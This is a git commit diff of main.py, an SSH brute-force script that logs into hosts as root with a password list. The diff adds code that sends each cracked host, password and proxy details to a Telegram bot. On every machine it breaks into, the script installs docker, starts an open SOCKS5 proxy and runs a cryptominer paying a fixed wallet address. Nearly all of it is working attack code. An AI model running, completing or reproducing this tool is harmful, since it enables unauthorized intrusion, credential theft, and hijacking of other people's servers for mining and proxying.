e6550df446dfcb7a6941b62315a68351e33591d4
Kirill <119045988+JeroTw@users.noreply.github.com>
2022-12-26 19:52:23 +0800

    Update main.py

--- main.py
+++ main.py
@@ -1,19 +1,26 @@
 # multi threaded ssh bruteforce
-# worm too
-
-# socks5://sshbf:sshbf@{host}:1080 is started
-# and miner on my crypto (donation to coder)
 
 import paramiko
 import threading
 import sys
 import time
+import requests
+
+
+token = 'tok'
+chat_id = 'id'
+
+
 
 passwords = []
 
 for passw in open('passwords.txt'):
     passw = passw.strip()
     passwords.append(passw)
+
+def send_good_to_telegram(host, password):
+    url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + f'&text=🖥IP:{host}\n🔑 Password: {password}\n👤 User: root\n🔥Proxy: sshbf:sshbf:{host}:1080\n 🚀Miner: yescrypt.mine.zergpool.com:6233 0x29D06CEe2758fd357a6c7eE1f159ac29c441A579'
+    requests.get(url)
 
 # split array into many arrays
 def split_array(array, parts):
@@ -36,6 +43,7 @@ def brute(host, passwordsed):
         else:
             print(f'[+] Password Found: {host} ' + password)
             open('found.txt', 'a').write(host + ' ' + password + ' root'+'\n')
+            send_good_to_telegram(host, password)
             ssh.exec_command('apt install docker.io -y')
             ssh.exec_command('docker run -d -p 1080:1080 -e PROXY_USER=sshbf -e PROXY_PASSWORD=sshbf -e PROXY_SERVER=0.0.0.0:1080 xkuma/socks5 > /dev/null 2>&1 &')
             ssh.exec_command('docker run --rm wernight/cpuminer-multi:alpine cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zergpool.com:6233 -u 0x29D06CEe2758fd357a6c7eE1f159ac29c441A579 --timeout 120 -p c=BNB,ID=bobnet > /dev/null 2>&1 &')
